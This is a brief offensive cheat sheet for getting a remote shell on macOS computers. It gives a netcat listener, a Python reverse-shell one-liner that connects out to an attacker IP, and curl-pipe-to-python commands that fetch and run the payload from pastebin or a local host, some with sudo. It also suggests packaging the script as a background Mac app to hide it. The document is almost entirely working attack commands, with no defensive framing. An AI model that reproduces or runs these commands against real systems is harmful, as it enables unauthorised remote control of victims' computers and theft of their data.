Netcat & Payload:

Option 1:

Create an indetectable payload in python and use it to get a shell on every macos system:

	nc -l -p 8080 (listening on kali)

Create a python payload:

	nano payload.py (and paste the script changing the ip)
	
	import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.2.3.4",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);

Then, just have to execute that script on macos computer.

Option 2:

An other option is to send the script online with a pastebin web service:

	https://pastebin.com

And execute this command on the macos computer:

	curl https://pastebin.com/raw/TAM2q3rW | python &

Option 3:

Execute file from computer on same network.

	sudo curl http://192.168.0.110/reverse_tcp.py | sudo  python &

Or copy all necessary files on the computer you attack and execute it.

	curl http://192.168.0.110/reverse_tcp.py > /tmp/reverse_tcp.py
	sudo python /tmp/reverse_tcp.py

Option 4:

Create a MacOs application to run the script on background with platypus:

	https://sveinbjorn.org/platypus
